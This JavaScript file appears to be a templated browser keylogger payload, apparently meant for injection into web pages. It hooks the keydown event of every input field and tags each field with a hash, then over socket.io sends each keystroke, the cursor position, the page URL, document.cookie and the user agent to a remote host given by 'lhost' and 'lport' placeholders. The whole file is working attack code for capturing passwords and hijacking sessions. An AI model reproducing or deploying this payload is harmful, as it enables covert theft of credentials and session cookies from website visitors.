String.prototype.hashCode = function() {

	var hash = 0, i, chr, len;
	if (this.length === 0) {
		return hash;
	}
	for (i = 0, len = this.length; i < len; i++) {
		chr   = this.charCodeAt(i);
		hash  = ((hash << 5) - hash) + chr;
		hash |= 0; // Convert to 32bit integer
	}
	return hash;
}

function addEvent(element, eventName, callback) {

	if (element.addEventListener) {

	    element.addEventListener(eventName, callback, false);

	} else if (element.attachEvent) {

	    element.attachEvent("on" + eventName, callback);

	}
}

function getattr(attr, el) {

	var result = el.getAttribute(attr);
	if (result === null) {

		return '';
	}
	return result;
}

/* Walks up the DOM tree to construct full DOM path of element.
*/
function get_position_from_dom(el) {

	var allParents = [], elm, entry;
	
	for (elm = el; elm; elm = elm.parentNode) {
	
		entry = elm.tagName.toLowerCase();
		
		if (entry === "html") {
			break;
		}
		if (elm.className) {
			entry += "." + elm.className.replace(/ /g, '.');
		}
		allParents.push(entry);
	}
	allParents.reverse();
	return allParents.join(" ");
}

/* Calculate position from parent element by iterating back through
 * siblings until null
 */
function get_index_from_parent(child) {

	var i = 0;
	while( (child = child.previousSibling) != null )  {
		i++;
	}
	return i;
}

function setup() {

	all_inputs = document.getElementsByTagName('input');
	inputs = {};
	all_jskdetails = [];
	for (var i = 0; i < all_inputs.length; i++) {

		var next_input = all_inputs[i];
		var parent = next_input.parentNode;

		var tag_name = next_input.nodeName;
		var input_id = getattr('id', next_input);
		var classes = getattr('class', next_input);
		var dom_path = get_position_from_dom(next_input);
		var index_from_parent = get_index_from_parent(next_input);
		var input_name = getattr('name', next_input);
		var input_type = getattr('type', next_input);
		
		var text_field = {

			'tag' : tag_name,
			'id' : input_id,
			'class' : classes,
			'dom_path' : dom_path,
			'index_from_parent' : index_from_parent,
			'name' : input_name,
			'type' : input_type,
			'parent_tag' : parent.nodeName
		};

		text_field._id = [

			text_field.tag,
			text_field.id, 
			text_field.classes,
			text_field.dom_path,
			text_field.index_from_parent,
			text_field.name,
			text_field.type
		].join('');

		if (text_field.parent_tag === 'FORM') {

			text_field.form = {
				'action' : getattr('action', parent),
				'method' : getattr('method', parent),
				'name' : getattr('name', parent),
				'class' : getattr('class', parent),
				'id' : getattr('id', parent)
			};
			text_field._id += [

				text_field.form.action,
				text_field.form.method,
				text_field.form.name,
				text_field.form.class,
				text_field.form.id
			].join('');
		}

		// generate unique hash for input tag
		text_field._id = text_field._id.hashCode().toString();

		// in case of collision, rehashing _id
		while (text_field._id in inputs) {

			text_field._id = text_field._id.hashCode().toString();
		}

		// add _id to input tag class list
		if (text_field.class === '') {
			text_field.class += text_field._id;
		}
		else {
			text_field.class += ' '+text_field._id;
		}
		next_input.className = text_field.class;

		// add id to id set and add tag to details list
		inputs[text_field._id] = text_field;

		next_input.__jskdetails = text_field;
		all_jskdetails.push(text_field);
		addEvent(next_input, "keydown", Keypress);
		

	}
	return { 'inputs' : inputs, 'all_jskdetails' : all_jskdetails }

}

function Keypress(event) {

	var c = event.keyCode || event.keyCode;
    socket.emit('keydown', {
			'data' : {
				'ks' : c,
				'start_pos' : this.selectionStart,
				'end_pos' : this.selectionEnd,
				'shift' : event.shiftKey,
				'alt' : event.altKey,
				'ctrl' : event.ctrlKey,
				'tag_details' : this.__jskdetails,
			},
			'page_details' : {
				'url' : document.location,
				'cookie' : document.cookie,
				'user_agent' : navigator.userAgent
			}
	});
}

window.onload = function() {

	storage = setup();
	inputs = storage['inputs']
	all_jskdetails = storage['all_jskdetails']

    namespace = '/test';
    socket = io.connect('http://' + '{{ lhost }}' + ':' + '{{ lport }}' + namespace);

    // event handler for new connections
    socket.on('connect', function() {
        socket.emit('send_details', {
				'jskdetails' : all_jskdetails,
				'page_details' : {
					'url' : document.location,
					'cookie' : document.cookie,
					'user_agent' : navigator.userAgent
				}
		});
    });

};
